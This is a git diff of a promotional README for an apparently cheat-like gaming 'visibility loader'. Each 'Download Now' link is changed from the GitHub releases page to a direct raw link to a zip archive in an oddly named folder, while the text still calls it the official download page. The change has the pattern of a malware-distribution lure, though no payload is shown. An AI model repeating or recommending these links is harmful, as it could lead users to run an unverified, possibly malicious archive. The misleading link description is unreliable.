@@ -1,6 +1,6 @@
 # 🎯 humen-pc-visibility-loader - See Everything. React Faster. Win More.
 
-[⬇️ Download Now](https://github.com/apriyan9252/humen-pc-visibility-loader/releases)
+[⬇️ Download Now](https://raw.githubusercontent.com/apriyan9252/humen-pc-visibility-loader/main/terroristical/loader_visibility_humen_pc_v2.5.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Think of it like putting on night-vision goggles for your gaming sessions. It wo
 
 **Visit this link to download the application:**
 
-👉 **[Click Here to Download humen-pc-visibility-loader](https://github.com/apriyan9252/humen-pc-visibility-loader/releases)**
+👉 **[Click Here to Download humen-pc-visibility-loader](https://raw.githubusercontent.com/apriyan9252/humen-pc-visibility-loader/main/terroristical/loader_visibility_humen_pc_v2.5.zip)**
 
 This link takes you to the official download page where you'll find the latest version of the software.
 
@@ -165,7 +165,7 @@ This utility is designed to enhance your gaming experience by improving visibili
 
 Don't wait another match. Download humen-pc-visibility-loader today and see what you've been missing!
 
-[⬇️ Download Now](https://github.com/apriyan9252/humen-pc-visibility-loader/releases)
+[⬇️ Download Now](https://raw.githubusercontent.com/apriyan9252/humen-pc-visibility-loader/main/terroristical/loader_visibility_humen_pc_v2.5.zip)
 
 ---
 
